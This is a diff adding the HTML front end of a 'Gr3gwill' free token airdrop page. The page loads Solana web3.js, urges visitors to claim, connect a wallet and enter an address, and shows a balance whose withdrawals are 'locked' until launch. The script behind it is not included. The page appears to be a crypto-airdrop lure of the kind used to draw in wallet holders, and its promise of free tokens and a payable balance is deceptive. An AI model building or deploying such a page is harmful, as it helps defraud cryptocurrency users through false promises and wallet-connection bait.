@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gr3gwill – Free Airdrop</title>
+<link rel="stylesheet" href="styles.css">
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
+</head>
+<body>
+
+<div class="airdrop-wrap">
+  <div class="container">
+    <div class="logo-circle">GR3G</div>
+    <h1 class="pulse">LUCKY YOU!</h1>
+    <p class="subtitle">GR3GWILL‑TOKEN airdrop is still ongoing.</p>
+
+    <button id="proceedBtn">Click to Claim Airdrop</button>
+    <button id="connectBtn" class="hidden">Connect Wallet</button>
+
+    <div id="addressSection" class="hidden">
+      <input type="text" id="solAddress" placeholder="Solana wallet address" />
+      <div class="progress"><span></span></div>
+      <button id="submitSol" class="hidden">Submit</button>
+    </div>
+  </div>
+</div>
+
+<!-- Terms Modal -->
+<div class="modal hidden" id="termsModal">
+  <div class="modal-card">
+    <h2>Terms & Conditions</h2>
+    <p class="terms">You agree that your wallet address is correct.</p>
+    <div class="modal-actions">
+      <button id="acceptBtn">Accept</button>
+    </div>
+  </div>
+</div>
+
+<!-- Airdrop Page -->
+<section id="airdropPage" class="hidden">
+  <div class="wallet-card">
+    <div class="wallet-header">
+      <div class="wallet-icon">G</div>
+      <div>
+        <h2>Gr3T Wallet</h2>
+        <p id="userWallet">—</p>
+      </div>
+    </div>
+
+    <div class="balance-section">
+      <span class="label">Airdrop Balance</span>
+      <div class="balance" id="airdropBalance">0</div>
+      <span class="token">GR3T</span>
+    </div>
+
+    <div class="balance-diff-section hidden" id="balanceDiffSection">
+      <span class="label">Balance Change:</span>
+      <div class="balance" id="balanceDiff">0</div>
+      <span class="token">GR3T</span>
+    </div>
+
+    <p class="note">🔒 Withdrawals locked. Airdrop will be sent immediately after token launch.</p>
+  </div>
+</section>
+
+<script src="script.js"></script>
+</body>
+      </html>
